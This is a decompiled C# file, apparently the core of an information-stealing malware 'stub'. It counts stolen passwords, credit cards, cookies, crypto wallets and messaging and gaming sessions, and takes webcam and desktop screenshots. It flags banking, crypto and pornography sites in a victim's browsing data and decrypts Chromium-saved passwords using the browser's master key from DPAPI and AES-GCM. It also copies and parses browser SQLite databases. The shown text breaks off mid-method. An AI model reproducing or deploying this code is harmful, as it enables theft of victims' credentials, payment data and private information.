using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Stub
{
	// Token: 0x0200000C RID: 12
	public static class Plugin
	{
		// Token: 0x0200000D RID: 13
		internal sealed class Counter
		{
			// Token: 0x06000020 RID: 32 RVA: 0x00002750 File Offset: 0x00000950
			public static string GetSValue(string application, bool value)
			{
				if (!value)
				{
					return "";
				}
				return "\n   ∟ " + application;
			}

			// Token: 0x06000021 RID: 33 RVA: 0x00004034 File Offset: 0x00002234
			public static string GetIValue(string application, int value)
			{
				if (value == 0)
				{
					return "";
				}
				return string.Concat(new object[]
				{
					"\n   ∟ ",
					application,
					": ",
					value
				});
			}

			// Token: 0x06000022 RID: 34 RVA: 0x00004074 File Offset: 0x00002274
			public static string GetLValue(string application, List<string> value, char separator = '∟')
			{
				value.Sort();
				if (value.Count == 0)
				{
					return "\n   ∟ " + application + " (No data)";
				}
				return string.Concat(new object[]
				{
					"\n   ∟ ",
					application,
					":\n\t\t\t\t\t\t\t",
					separator,
					" ",
					string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value)
				});
			}

			// Token: 0x06000023 RID: 35 RVA: 0x00002766 File Offset: 0x00000966
			public static string GetBValue(bool value, string success, string failed)
			{
				if (!value)
				{
					return "\n   ∟ " + failed;
				}
				return "\n   ∟ " + success;
			}

			// Token: 0x04000038 RID: 56
			public static int Passwords = 0;

			// Token: 0x04000039 RID: 57
			public static int CreditCards = 0;

			// Token: 0x0400003A RID: 58
			public static int AutoFill = 0;

			// Token: 0x0400003B RID: 59
			public static int Cookies = 0;

			// Token: 0x0400003C RID: 60
			public static int History = 0;

			// Token: 0x0400003D RID: 61
			public static int Bookmarks = 0;

			// Token: 0x0400003E RID: 62
			public static int Downloads = 0;

			// Token: 0x0400003F RID: 63
			public static int VPN = 0;

			// Token: 0x04000040 RID: 64
			public static int Pidgin = 0;

			// Token: 0x04000041 RID: 65
			public static int Wallets = 0;

			// Token: 0x04000042 RID: 66
			public static int FTPHosts = 0;

			// Token: 0x04000043 RID: 67
			public static bool Telegram = false;

			// Token: 0x04000044 RID: 68
			public static bool Steam = false;

			// Token: 0x04000045 RID: 69
			public static bool Uplay = false;

			// Token: 0x04000046 RID: 70
			public static bool Discord = false;

			// Token: 0x04000047 RID: 71
			public static int SavedWifiNetworks = 0;

			// Token: 0x04000048 RID: 72
			public static bool ProductKey = false;

			// Token: 0x04000049 RID: 73
			public static bool DesktopScreenshot = false;

			// Token: 0x0400004A RID: 74
			public static bool WebcamScreenshot = false;

			// Token: 0x0400004B RID: 75
			public static int GrabberDocuments = 0;

			// Token: 0x0400004C RID: 76
			public static int GrabberSourceCodes = 0;

			// Token: 0x0400004D RID: 77
			public static int GrabberDatabases = 0;

			// Token: 0x0400004E RID: 78
			public static int GrabberImages = 0;

			// Token: 0x0400004F RID: 79
			public static bool BankingServices = false;

			// Token: 0x04000050 RID: 80
			public static bool CryptoServices = false;

			// Token: 0x04000051 RID: 81
			public static bool PornServices = false;

			// Token: 0x04000052 RID: 82
			public static List<string> DetectedBankingServices = new List<string>();

			// Token: 0x04000053 RID: 83
			public static List<string> DetectedCryptoServices = new List<string>();

			// Token: 0x04000054 RID: 84
			public static List<string> DetectedPornServices = new List<string>();
		}

		// Token: 0x0200000E RID: 14
		internal sealed class Banking
		{
			// Token: 0x06000026 RID: 38 RVA: 0x000041B8 File Offset: 0x000023B8
			private static bool AppendValue(string value, List<string> domains)
			{
				string text = value.Replace("www.", "").ToLower();
				if (text.Contains("google") || text.Contains("bing") || text.Contains("yandex") || text.Contains("duckduckgo"))
				{
					return false;
				}
				if (text.StartsWith("."))
				{
					text = text.Substring(1);
				}
				try
				{
					text = new Uri(text).Host;
				}
				catch (UriFormatException)
				{
				}
				text = Path.GetFileNameWithoutExtension(text);
				text = text.Replace(".com", "").Replace(".org", "");
				foreach (string text2 in domains)
				{
					if (text.ToLower().Replace(" ", "").Contains(text2.ToLower().Replace(" ", "")))
					{
						return false;
					}
				}
				text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
				domains.Add(text);
				return true;
			}

			// Token: 0x06000027 RID: 39 RVA: 0x000042F4 File Offset: 0x000024F4
			private static void DetectCryptocurrencyServices(string value)
			{
				foreach (string value2 in Plugin.Banking.CryptoServices)
				{
					if (value.ToLower().Contains(value2) && value.Length < 25 && Plugin.Banking.AppendValue(value, Plugin.Counter.DetectedCryptoServices))
					{
						Plugin.Counter.CryptoServices = true;
						break;
					}
				}
			}

			// Token: 0x06000028 RID: 40 RVA: 0x00004348 File Offset: 0x00002548
			private static void DetectBankingServices(string value)
			{
				foreach (string value2 in Plugin.Banking.BankingServices)
				{
					if (value.ToLower().Contains(value2) && value.Length < 25 && Plugin.Banking.AppendValue(value, Plugin.Counter.DetectedBankingServices))
					{
						Plugin.Counter.BankingServices = true;
						break;
					}
				}
			}

			// Token: 0x06000029 RID: 41 RVA: 0x0000439C File Offset: 0x0000259C
			private static void DetectPornServices(string value)
			{
				foreach (string value2 in Plugin.Banking.PornServices)
				{
					if (value.ToLower().Contains(value2) && value.Length < 25 && Plugin.Banking.AppendValue(value, Plugin.Counter.DetectedPornServices))
					{
						Plugin.Counter.PornServices = true;
						break;
					}
				}
			}

			// Token: 0x0600002A RID: 42 RVA: 0x00002782 File Offset: 0x00000982
			public static void ScanData(string value)
			{
				Plugin.Banking.DetectBankingServices(value);
				Plugin.Banking.DetectCryptocurrencyServices(value);
				Plugin.Banking.DetectPornServices(value);
			}

			// Token: 0x0600002B RID: 43 RVA: 0x000043F0 File Offset: 0x000025F0
			public static string DetectCreditCardType(string number)
			{
				foreach (KeyValuePair<string, Regex> keyValuePair in Plugin.Banking.CreditCardTypes)
				{
					if (keyValuePair.Value.Match(number.Replace(" ", "")).Success)
					{
						return keyValuePair.Key;
					}
				}
				return "Unknown";
			}

			// Token: 0x04000055 RID: 85
			public static string[] CryptoServices = new string[]
			{
				"bitcoin",
				"monero",
				"dashcoin",
				"litecoin",
				"etherium",
				"stellarcoin",
				"btc",
				"eth",
				"xmr",
				"xlm",
				"xrp",
				"ltc",
				"bch",
				"blockchain",
				"paxful",
				"investopedia",
				"buybitcoinworldwide",
				"cryptocurrency",
				"crypto",
				"trade",
				"trading",
				"биткоин",
				"wallet"
			};

			// Token: 0x04000056 RID: 86
			public static string[] PornServices = new string[]
			{
				"porn",
				"sex",
				"hentai",
				"порно",
				"sex"
			};

			// Token: 0x04000057 RID: 87
			public static string[] BankingServices = new string[]
			{
				"qiwi",
				"money",
				"exchange",
				"bank",
				"credit",
				"card",
				"банк",
				"кредит"
			};

			// Token: 0x04000058 RID: 88
			private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
			{
				{
					"Amex Card",
					new Regex("^3[47][0-9]{13}$")
				},
				{
					"BCGlobal",
					new Regex("^(6541|6556)[0-9]{12}$")
				},
				{
					"Carte Blanche Card",
					new Regex("^389[0-9]{11}$")
				},
				{
					"Diners Club Card",
					new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
				},
				{
					"Discover Card",
					new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
				},
				{
					"Insta Payment Card",
					new Regex("^63[7-9][0-9]{13}$")
				},
				{
					"JCB Card",
					new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
				},
				{
					"KoreanLocalCard",
					new Regex("^9[0-9]{15}$")
				},
				{
					"Laser Card",
					new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
				},
				{
					"Maestro Card",
					new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
				},
				{
					"Mastercard",
					new Regex("5[1-5][0-9]{14}$")
				},
				{
					"Solo Card",
					new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
				},
				{
					"Switch Card",
					new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
				},
				{
					"Union Pay Card",
					new Regex("^(62[0-9]{14,17})$")
				},
				{
					"Visa Card",
					new Regex("4[0-9]{12}(?:[0-9]{3})?$")
				},
				{
					"Visa Master Card",
					new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
				},
				{
					"Express Card",
					new Regex("3[47][0-9]{13}$")
				}
			};
		}

		// Token: 0x0200000F RID: 15
		public static class cBCrypt
		{
			// Token: 0x0600002E RID: 46
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

			// Token: 0x0600002F RID: 47
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

			// Token: 0x06000030 RID: 48
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

			// Token: 0x06000031 RID: 49
			[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
			internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

			// Token: 0x06000032 RID: 50
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

			// Token: 0x06000033 RID: 51
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptDestroyKey(IntPtr hKey);

			// Token: 0x06000034 RID: 52
			[DllImport("bcrypt.dll")]
			internal static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref Plugin.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

			// Token: 0x04000059 RID: 89
			public const uint ERROR_SUCCESS = 0U;

			// Token: 0x0400005A RID: 90
			public const uint BCRYPT_PAD_PSS = 8U;

			// Token: 0x0400005B RID: 91
			public const uint BCRYPT_PAD_OAEP = 4U;

			// Token: 0x0400005C RID: 92
			public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(1296188491);

			// Token: 0x0400005D RID: 93
			public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";

			// Token: 0x0400005E RID: 94
			public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";

			// Token: 0x0400005F RID: 95
			public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

			// Token: 0x04000060 RID: 96
			public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";

			// Token: 0x04000061 RID: 97
			public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";

			// Token: 0x04000062 RID: 98
			public static readonly string BCRYPT_AES_ALGORITHM = "AES";

			// Token: 0x04000063 RID: 99
			public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

			// Token: 0x04000064 RID: 100
			public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 1;

			// Token: 0x04000065 RID: 101
			public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

			// Token: 0x04000066 RID: 102
			public static readonly uint STATUS_AUTH_TAG_MISMATCH = 3221266434U;

			// Token: 0x02000010 RID: 16
			public struct BCRYPT_PSS_PADDING_INFO
			{
				// Token: 0x06000036 RID: 54 RVA: 0x00002796 File Offset: 0x00000996
				public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
				{
					this.pszAlgId = pszAlgId;
					this.cbSalt = cbSalt;
				}

				// Token: 0x04000067 RID: 103
				[MarshalAs(UnmanagedType.LPWStr)]
				public string pszAlgId;

				// Token: 0x04000068 RID: 104
				public int cbSalt;
			}

			// Token: 0x02000011 RID: 17
			public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
			{
				// Token: 0x06000037 RID: 55 RVA: 0x000047BC File Offset: 0x000029BC
				public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
				{
					this = default(Plugin.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
					this.dwInfoVersion = Plugin.cBCrypt.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
					this.cbSize = Marshal.SizeOf(typeof(Plugin.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
					if (iv != null)
					{
						this.cbNonce = iv.Length;
						this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
						Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
					}
					if (aad != null)
					{
						this.cbAuthData = aad.Length;
						this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
						Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
					}
					if (tag != null)
					{
						this.cbTag = tag.Length;
						this.pbTag = Marshal.AllocHGlobal(this.cbTag);
						Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
						this.cbMacContext = tag.Length;
						this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
					}
				}

				// Token: 0x06000038 RID: 56 RVA: 0x0000489C File Offset: 0x00002A9C
				public void Dispose()
				{
					if (this.pbNonce != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbNonce);
					}
					if (this.pbTag != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbTag);
					}
					if (this.pbAuthData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbAuthData);
					}
					if (this.pbMacContext != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbMacContext);
					}
				}

				// Token: 0x04000069 RID: 105
				public int cbSize;

				// Token: 0x0400006A RID: 106
				public int dwInfoVersion;

				// Token: 0x0400006B RID: 107
				public IntPtr pbNonce;

				// Token: 0x0400006C RID: 108
				public int cbNonce;

				// Token: 0x0400006D RID: 109
				public IntPtr pbAuthData;

				// Token: 0x0400006E RID: 110
				public int cbAuthData;

				// Token: 0x0400006F RID: 111
				public IntPtr pbTag;

				// Token: 0x04000070 RID: 112
				public int cbTag;

				// Token: 0x04000071 RID: 113
				public IntPtr pbMacContext;

				// Token: 0x04000072 RID: 114
				public int cbMacContext;

				// Token: 0x04000073 RID: 115
				public int cbAAD;

				// Token: 0x04000074 RID: 116
				public long cbData;

				// Token: 0x04000075 RID: 117
				public int dwFlags;
			}

			// Token: 0x02000012 RID: 18
			public struct BCRYPT_KEY_LENGTHS_STRUCT
			{
				// Token: 0x04000076 RID: 118
				public int dwMinLength;

				// Token: 0x04000077 RID: 119
				public int dwMaxLength;

				// Token: 0x04000078 RID: 120
				public int dwIncrement;
			}

			// Token: 0x02000013 RID: 19
			public struct BCRYPT_OAEP_PADDING_INFO
			{
				// Token: 0x06000039 RID: 57 RVA: 0x000027A6 File Offset: 0x000009A6
				public BCRYPT_OAEP_PADDING_INFO(string alg)
				{
					this.pszAlgId = alg;
					this.pbLabel = IntPtr.Zero;
					this.cbLabel = 0;
				}

				// Token: 0x04000079 RID: 121
				[MarshalAs(UnmanagedType.LPWStr)]
				public string pszAlgId;

				// Token: 0x0400007A RID: 122
				public IntPtr pbLabel;

				// Token: 0x0400007B RID: 123
				public int cbLabel;
			}
		}

		// Token: 0x02000014 RID: 20
		private class cAesGcm
		{
			// Token: 0x0600003A RID: 58 RVA: 0x00004920 File Offset: 0x00002B20
			public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
			{
				IntPtr intPtr = this.OpenAlgorithmProvider(Plugin.cBCrypt.BCRYPT_AES_ALGORITHM, Plugin.cBCrypt.MS_PRIMITIVE_PROVIDER, Plugin.cBCrypt.BCRYPT_CHAIN_MODE_GCM);
				IntPtr hKey;
				IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
				Plugin.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new Plugin.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
				byte[] array2;
				using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
				{
					byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
					int num = 0;
					uint num2 = Plugin.cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0);
					if (num2 != 0U)
					{
						throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", num2));
					}
					array2 = new byte[num];
					num2 = Plugin.cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
					if (num2 == Plugin.cBCrypt.STATUS_AUTH_TAG_MISMATCH)
					{
						throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
					}
					if (num2 != 0U)
					{
						throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", num2));
					}
				}
				Plugin.cBCrypt.BCryptDestroyKey(hKey);
				Marshal.FreeHGlobal(hglobal);
				Plugin.cBCrypt.BCryptCloseAlgorithmProvider(intPtr, 0U);
				return array2;
			}

			// Token: 0x0600003B RID: 59 RVA: 0x00004A34 File Offset: 0x00002C34
			private int MaxAuthTagSize(IntPtr hAlg)
			{
				byte[] property = this.GetProperty(hAlg, Plugin.cBCrypt.BCRYPT_AUTH_TAG_LENGTH);
				return BitConverter.ToInt32(new byte[]
				{
					property[4],
					property[5],
					property[6],
					property[7]
				}, 0);
			}

			// Token: 0x0600003C RID: 60 RVA: 0x00004A74 File Offset: 0x00002C74
			private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
			{
				IntPtr zero = IntPtr.Zero;
				uint num = Plugin.cBCrypt.BCryptOpenAlgorithmProvider(out zero, alg, provider, 0U);
				if (num != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", num));
				}
				byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
				num = Plugin.cBCrypt.BCryptSetAlgorithmProperty(zero, Plugin.cBCrypt.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0);
				if (num != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", num));
				}
				return zero;
			}

			// Token: 0x0600003D RID: 61 RVA: 0x00004AE4 File Offset: 0x00002CE4
			private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
			{
				byte[] property = this.GetProperty(hAlg, Plugin.cBCrypt.BCRYPT_OBJECT_LENGTH);
				int num = BitConverter.ToInt32(property, 0);
				IntPtr intPtr = Marshal.AllocHGlobal(num);
				byte[] array = this.Concat(new byte[][]
				{
					Plugin.cBCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC,
					BitConverter.GetBytes(1),
					BitConverter.GetBytes(key.Length),
					key
				});
				uint num2 = Plugin.cBCrypt.BCryptImportKey(hAlg, IntPtr.Zero, Plugin.cBCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num, array, array.Length, 0U);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", num2));
				}
				return intPtr;
			}

			// Token: 0x0600003E RID: 62 RVA: 0x00004B78 File Offset: 0x00002D78
			private byte[] GetProperty(IntPtr hAlg, string name)
			{
				int num = 0;
				uint num2 = Plugin.cBCrypt.BCryptGetProperty(hAlg, name, null, 0, ref num, 0U);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", num2));
				}
				byte[] array = new byte[num];
				num2 = Plugin.cBCrypt.BCryptGetProperty(hAlg, name, array, array.Length, ref num, 0U);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", num2));
				}
				return array;
			}

			// Token: 0x0600003F RID: 63 RVA: 0x00004BE0 File Offset: 0x00002DE0
			public byte[] Concat(params byte[][] arrays)
			{
				int num = 0;
				foreach (byte[] array in arrays)
				{
					if (array != null)
					{
						num += array.Length;
					}
				}
				byte[] array2 = new byte[num - 1 + 1];
				int num2 = 0;
				foreach (byte[] array3 in arrays)
				{
					if (array3 != null)
					{
						Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
						num2 += array3.Length;
					}
				}
				return array2;
			}
		}

		// Token: 0x02000015 RID: 21
		internal sealed class Crypto
		{
			// Token: 0x06000041 RID: 65
			[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern bool CryptUnprotectData(ref Plugin.Crypto.DataBlob pCipherText, ref string pszDescription, ref Plugin.Crypto.DataBlob pEntropy, IntPtr pReserved, ref Plugin.Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Plugin.Crypto.DataBlob pPlainText);

			// Token: 0x06000042 RID: 66 RVA: 0x00004C58 File Offset: 0x00002E58
			public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
			{
				Plugin.Crypto.DataBlob dataBlob = default(Plugin.Crypto.DataBlob);
				Plugin.Crypto.DataBlob dataBlob2 = default(Plugin.Crypto.DataBlob);
				Plugin.Crypto.DataBlob dataBlob3 = default(Plugin.Crypto.DataBlob);
				Plugin.Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Plugin.Crypto.CryptprotectPromptstruct
				{
					cbSize = Marshal.SizeOf(typeof(Plugin.Crypto.CryptprotectPromptstruct)),
					dwPromptFlags = 0,
					hwndApp = IntPtr.Zero,
					szPrompt = null
				};
				string empty = string.Empty;
				try
				{
					try
					{
						if (bCipher == null)
						{
							bCipher = new byte[0];
						}
						dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
						dataBlob2.cbData = bCipher.Length;
						Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
					}
					catch
					{
					}
					try
					{
						if (bEntropy == null)
						{
							bEntropy = new byte[0];
						}
						dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
						dataBlob3.cbData = bEntropy.Length;
						Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
					}
					catch
					{
					}
					Plugin.Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
					byte[] array = new byte[dataBlob.cbData];
					Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
					return array;
				}
				catch
				{
				}
				finally
				{
					if (dataBlob.pbData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(dataBlob.pbData);
					}
					if (dataBlob2.pbData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(dataBlob2.pbData);
					}
					if (dataBlob3.pbData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(dataBlob3.pbData);
					}
				}
				return new byte[0];
			}

			// Token: 0x06000043 RID: 67 RVA: 0x00004E18 File Offset: 0x00003018
			public static byte[] GetMasterKey(string sLocalStateFolder)
			{
				string text;
				if (sLocalStateFolder.Contains("Opera"))
				{
					text = sLocalStateFolder + "\\Opera Stable\\Local State";
				}
				else
				{
					text = sLocalStateFolder + "\\Local State";
				}
				byte[] array = new byte[0];
				if (!File.Exists(text))
				{
					return null;
				}
				if (text != Plugin.Crypto.sPrevBrowserPath)
				{
					Plugin.Crypto.sPrevBrowserPath = text;
					MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text));
					foreach (object obj in matchCollection)
					{
						Match match = (Match)obj;
						if (match.Success)
						{
							array = Convert.FromBase64String(match.Groups[1].Value);
						}
					}
					byte[] array2 = new byte[array.Length - 5];
					Array.Copy(array, 5, array2, 0, array.Length - 5);
					byte[] result;
					try
					{
						Plugin.Crypto.sPrevMasterKey = Plugin.Crypto.DPAPIDecrypt(array2, null);
						result = Plugin.Crypto.sPrevMasterKey;
					}
					catch
					{
						result = null;
					}
					return result;
				}
				return Plugin.Crypto.sPrevMasterKey;
			}

			// Token: 0x06000044 RID: 68 RVA: 0x00004F3C File Offset: 0x0000313C
			public static string GetUTF8(string sNonUtf8)
			{
				string result;
				try
				{
					byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
					result = Encoding.UTF8.GetString(bytes);
				}
				catch
				{
					result = sNonUtf8;
				}
				return result;
			}

			// Token: 0x06000045 RID: 69 RVA: 0x00004F7C File Offset: 0x0000317C
			public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
			{
				byte[] array = new byte[12];
				byte[] array2 = array;
				Array.Copy(bEncryptedData, 3, array2, 0, 12);
				byte[] result;
				try
				{
					byte[] array3 = new byte[bEncryptedData.Length - 15];
					Array.Copy(bEncryptedData, 15, array3, 0, bEncryptedData.Length - 15);
					byte[] array4 = new byte[16];
					byte[] array5 = new byte[array3.Length - array4.Length];
					Array.Copy(array3, array3.Length - 16, array4, 0, 16);
					Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
					Plugin.cAesGcm cAesGcm = new Plugin.cAesGcm();
					result = cAesGcm.Decrypt(bMasterKey, array2, null, array5, array4);
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
					result = null;
				}
				return result;
			}

			// Token: 0x06000046 RID: 70 RVA: 0x00005028 File Offset: 0x00003228
			public static string EasyDecrypt(string sLoginData, string sPassword)
			{
				if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
				{
					byte[] masterKey = Plugin.Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
					return Encoding.Default.GetString(Plugin.Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
				}
				return Encoding.Default.GetString(Plugin.Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
			}

			// Token: 0x0400007C RID: 124
			private static string sPrevBrowserPath = "";

			// Token: 0x0400007D RID: 125
			private static byte[] sPrevMasterKey = new byte[0];

			// Token: 0x02000016 RID: 22
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct CryptprotectPromptstruct
			{
				// Token: 0x0400007E RID: 126
				public int cbSize;

				// Token: 0x0400007F RID: 127
				public int dwPromptFlags;

				// Token: 0x04000080 RID: 128
				public IntPtr hwndApp;

				// Token: 0x04000081 RID: 129
				public string szPrompt;
			}

			// Token: 0x02000017 RID: 23
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct DataBlob
			{
				// Token: 0x04000082 RID: 130
				public int cbData;

				// Token: 0x04000083 RID: 131
				public IntPtr pbData;
			}
		}

		// Token: 0x02000018 RID: 24
		internal sealed class SqlReader
		{
			// Token: 0x06000049 RID: 73 RVA: 0x0000509C File Offset: 0x0000329C
			public static Plugin.SQLite ReadTable(string database, string table)
			{
				if (!File.Exists(database))
				{
					return null;
				}
				string text = Path.GetTempFileName() + ".dat";
				File.Copy(database, text);
				Plugin.SQLite sqlite = new Plugin.SQLite(text);
				sqlite.ReadTable(table);
				File.Delete(text);
				if (sqlite.GetRowCount() == 65536)
				{
					return null;
				}
				return sqlite;
			}
		}

		// Token: 0x02000019 RID: 25
		internal class SQLite
		{
			// Token: 0x0600004B RID: 75 RVA: 0x000050F0 File Offset: 0x000032F0
			public SQLite(string fileName)
			{
				this._fileBytes = File.ReadAllBytes(fileName);
				this._pageSize = this.ConvertToULong(16, 2);
				this._dbEncoding = this.ConvertToULong(56, 4);
				this.ReadMasterTable(100L);
			}

			// Token: 0x0600004C RID: 76 RVA: 0x00005150 File Offset: 0x00003350
			public string GetValue(int rowNum, int field)
			{
				string result;
				try
				{
					if (rowNum >= this._tableEntries.Length)
					{
						result = null;
					}
					else
					{
						result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
					}
				}
				catch
				{
					result = "";
				}
				return result;
			}

			// Token: 0x0600004D RID: 77 RVA: 0x000027D8 File Offset: 0x000009D8
			public int GetRowCount()
			{
				return this._tableEntries.Length;
			}

			// Token: 0x0600004E RID: 78 RVA: 0x000051B8 File Offset: 0x000033B8
			private bool ReadTableFromOffset(ulong offset)
			{
				bool result;
				try
				{
					if (this._fileBytes[(int)(checked((IntPtr)offset))] == 13)
					{
						uint num = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
						int num2 = 0;
						if (this._tableEntries != null)
						{
							num2 = this._tableEntries.Length;
							Array.Resize<Plugin.SQLite.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
						}
						else
						{
							this._tableEntries = new Plugin.SQLite.TableEntry[num + 1U];
						}
						for (uint num3 = 0U; num3 <= num; num3 += 1U)
						{
							ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
